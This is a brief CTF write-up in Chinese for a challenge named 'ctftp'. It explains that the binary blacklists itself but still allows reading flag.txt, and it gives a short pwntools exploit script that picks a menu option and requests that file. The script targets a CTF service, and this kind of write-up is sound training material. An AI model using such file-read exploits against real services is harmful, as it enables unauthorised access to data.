### ctftp

> [附件](./ctftp)

在bss段可以看到程序本身被添加到黑名单了，但是可以直接读flag.txt

[Exploit script:](./c2.py)

```python
from pwn import *

e = ELF('ctftp')
p = process('ctftp')
#p = remote('chal.tuctf.com', 30500)

p.sendlineafter(': ', 'xxx')
p.sendlineafter('> ', '2')

p.sendlineafter(': ','flag.txt')
p.interactive()
```

